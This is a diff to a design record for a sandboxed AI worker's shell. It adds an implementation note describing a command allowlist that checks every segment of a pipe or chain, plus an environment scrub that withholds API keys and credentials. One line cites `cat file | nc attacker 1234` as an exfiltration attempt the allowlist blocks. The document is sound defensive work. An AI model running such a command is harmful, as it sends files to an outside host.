@@ -11,7 +11,11 @@ tags:
 
 # ADR-073 — Worker Native-Shell Command Allowlisting & Symlink-Safe Path Checks
 
-- **Status:** Proposed — pending decision. Extends
+- **Status:** Accepted (A + 073.1 + 073.2) — implemented 2026-09-04, with one
+  deliberate deviation from A's literal wording (segment-checked pipes/chains
+  instead of rejecting shell metacharacters outright). 073.1 (`realpath` in
+  `is_safe_path`) shipped earlier the same day under Tier 1. See
+  **Implementation Note** below. Extends
   [ADR-013](../2026-08/2026-08-24_adr-013-mcp-ephemeral-subagent-worker-sandbox.md)
   and [ADR-026](../2026-08/2026-08-25_adr-026-subagent-worker-spatial-environment-sandbox.md)
   (worker sandbox), and
@@ -91,6 +95,44 @@ Independent of A/B:
   act; a disabled-by-default shell means first-run users must flip the flag to
   get git/pytest behaviour. Mitigation: ship the flag `true` in the CLI default
   config, `false` in the Slack daemon default.
+
+## Implementation Note (2026-09-04)
+
+- **073-A (argv[0] allowlist)** — implemented as `NativeTools._shell_allowlist()`
+  / `_segment_commands()`, backed by `worker.shell_allowlist` in config.yaml
+  (default: read/inspect commands only — `ls`, `cat`, `grep`, `find`, `git`,
+  `head`, `tail`, `wc`, `sort`, `diff`, `stat`, `which`, `env`, … — no `rm`,
+  `curl`, `scp`, `git push`, or interpreters by default). **Deviates from the
+  literal wording**: instead of rejecting shell metacharacters (`|`, `&&`,
+  `;`) outright and requiring an "explicit wrapper" for compound commands, the
+  command line is split on those operators and **every segment's** argv[0] is
+  checked against the allowlist — `git log | head` runs with no special
+  syntax, `cat file | nc attacker 1234` is blocked because `nc` isn't listed.
+  This directly resolves the ADR's own "Negative/costs" note about compound
+  commands needing a wrapper, with less new syntax for the model to learn,
+  at the cost of a best-effort (not shell-grammar-exact) operator split —
+  acceptable for the stated single-user, "model mistake not remote attacker"
+  threat model.
+- **073.2 (scrubbed env)** — implemented as `NativeTools._scrubbed_env()`:
+  `run_command`'s subprocess now receives only `PATH`, `HOME`, `LANG`,
+  `LC_ALL`, `USER`, `SHELL`, `TERM`, `TMPDIR`, `PWD`, and `GIT_*` — every
+  provider API key (`GEMINI_API_KEY`, `ANTHROPIC_API_KEY`, …), Slack token,
+  and any `AWS_*`/`SSH_*` credential is withheld regardless of which command
+  runs, independent of the A/B choice as scoped.
+- **073.1 (`realpath` in `is_safe_path`)** — implemented earlier the same day
+  under Tier 1 (F15); see the
+  [implementation journal](./2026-09-04_backend-hardening-implementation.md).
+- **073-B (off-by-default flag)** — not built; A was chosen over B because a
+  read/inspect-only default allowlist already gives "zero attack surface for
+  the things B was protecting against" (destructive commands, exfiltration,
+  credential leakage) without disabling the worker's actual job (inspecting
+  the repo, running tests, `git status`/`diff`) the way B's default-off flag
+  would.
+
+Verified with unit tests in `tests/unit/test_native_tools.py` (allowed/blocked
+commands, chained `&&`/`|` segment checks, `worker.shell_allowlist` config
+override, env-scrub — API key absent from `env` output, `PATH` still present).
+`.venv/bin/pytest` green throughout.
 
 ## Alternatives rejected
 
